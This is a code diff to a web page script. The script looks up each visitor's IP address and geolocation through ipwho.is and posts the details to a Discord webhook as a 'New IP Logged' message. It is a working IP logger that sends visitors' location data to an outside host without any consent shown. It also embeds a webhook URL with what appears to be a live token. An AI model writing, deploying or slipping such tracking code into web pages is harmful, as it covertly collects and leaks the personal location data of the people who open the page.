@@ -12,13 +12,11 @@
     <script>
         async function fetchIPData() {
             try {
-                // Get IP & Location in One Request (ipwho.is is CORS-friendly)
                 let response = await fetch("https://ipwho.is/");
                 let data = await response.json();
 
                 if (!data.success) throw new Error("Failed to fetch data");
 
-                // Extract useful info
                 let details = {
                     ip: data.ip,
                     city: data.city,
@@ -29,15 +27,18 @@
                     lon: data.longitude
                 };
 
-                // Display Data
                 document.getElementById("output").innerText = JSON.stringify(details, null, 2);
 
-                // Send Data to Webhook (Replace with your webhook URL)
-                let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK";  // Replace with your webhook
+                // Format data for Discord
+                let webhookData = {
+                    content: `**New IP Logged**\n\`\`\`json\n${JSON.stringify(details, null, 2)}\n\`\`\``
+                };
+
+                let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK";  // Replace with your actual webhook URL
                 fetch(webhookUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(details)
+                    body: JSON.stringify(webhookData)
                 });
 
             } catch (error) {
